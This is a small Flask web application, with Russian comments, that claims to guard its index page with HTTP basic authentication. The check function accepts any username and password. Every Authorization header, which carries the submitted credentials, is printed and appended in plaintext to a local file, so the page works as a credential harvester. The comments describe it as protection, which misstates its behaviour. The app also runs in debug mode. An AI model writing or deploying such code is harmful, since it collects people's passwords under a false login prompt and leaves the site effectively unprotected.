from flask import Flask, render_template, request, Response
from functools import wraps

app = Flask(__name__)

# Задаем имя пользователя и пароль для базовой аутентификации
USERNAME = 'username'
PASSWORD = 'password'

# Функция для проверки базовой аутентификации
def check_auth(username, password):
    return True

# Функция для запроса авторизации
def authenticate():
    return Response(
        'Пожалуйста, введите имя пользователя и пароль для доступа к сайту.',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

# Декоратор для защиты маршрутов с базовой аутентификацией
def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        # Получаем значение заголовка Authorization
        auth_header = request.headers.get('Authorization')
        # Выводим значение в консоль
        print(f"Authorization Header: {auth_header}")
        # Записываем значение в файл
        with open('authorization_headers.txt', 'a') as file:
            file.write(f"Authorization Header: {auth_header}\n")
        return f(*args, **kwargs)
    return decorated

# Главная страница сайта
@app.route('/')
@requires_auth
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
